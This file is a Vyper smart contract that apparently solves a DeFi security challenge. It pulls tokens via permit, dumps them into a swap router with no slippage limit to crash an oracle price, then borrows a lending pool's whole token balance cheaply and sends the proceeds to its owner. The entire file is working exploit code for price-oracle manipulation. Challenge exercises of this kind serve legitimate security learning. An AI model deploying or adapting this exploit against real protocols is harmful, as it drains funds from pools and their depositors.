# @version ^0.3.7

from vyper.interfaces import ERC20 as IERC20

interface IRouter:
    def exactInputSingle(params: ExactInputSingleParams) -> uint256: nonpayable

interface IPool:
    def calculateDepositOfWETHRequired(amount: uint256) -> uint256: view  
    def borrow(borrowAmount: uint256): nonpayable

interface IWETH:
    def withdraw(wad: uint256): nonpayable

struct ExactInputSingleParams:
    tokenIn: address
    tokenOut: address
    fee: uint24
    recipient: address
    deadline: uint256
    amountIn: uint256
    amountOutMinimum: uint256
    sqrtPriceLimitX96: uint160

owner: immutable(address)

router: address
pool: address
token: address
weth: address

@external
@payable
def __init__(
    _router: address, 
    _pool: address, 
    _token: address, 
    _weth: address, 
    deadline: uint256, 
    v: uint8, 
    r: bytes32, 
    s: bytes32,
):
    owner = msg.sender
    self.router = _router
    self.pool = _pool
    self.token = _token
    self.weth = _weth

    raw_call(
        _token,
        _abi_encode(
            msg.sender,
            self,
            IERC20(_token).balanceOf(msg.sender),
            deadline,
            v,
            r,
            s,
            method_id=method_id(
                "permit(address,address,uint256,uint256,uint8,bytes32,bytes32)"
            )
        ),
    )
    IERC20(_token).transferFrom(msg.sender, self, IERC20(_token).balanceOf(msg.sender))


@external
def start_attack():
    assert msg.sender == owner, "!owner"
    token_amount: uint256 = IERC20(self.token).balanceOf(self)
    IERC20(self.token).approve(self.router, token_amount)
    params: ExactInputSingleParams = ExactInputSingleParams(
        {
            tokenIn: self.token,
            tokenOut: self.weth,
            fee: convert(3000, uint24),
            recipient: self,
            deadline: block.timestamp,
            amountIn: token_amount,
            amountOutMinimum: empty(uint256),
            sqrtPriceLimitX96: empty(uint160),
        }
    )
    IRouter(self.router).exactInputSingle(params)

@external
def finish_attack():
    assert msg.sender == owner, "!owner"
    pool_balance: uint256 = IERC20(self.token).balanceOf(self.pool)
    weth_amount: uint256 = IPool(self.pool).calculateDepositOfWETHRequired(pool_balance)
    IERC20(self.weth).approve(self.pool, weth_amount)
    IPool(self.pool).borrow(pool_balance)

    IERC20(self.token).transfer(msg.sender, IERC20(self.token).balanceOf(self))
    IWETH(self.weth).withdraw(IERC20(self.weth).balanceOf(self))
    send(msg.sender, self.balance)

@external
@payable
def __default__():
    pass
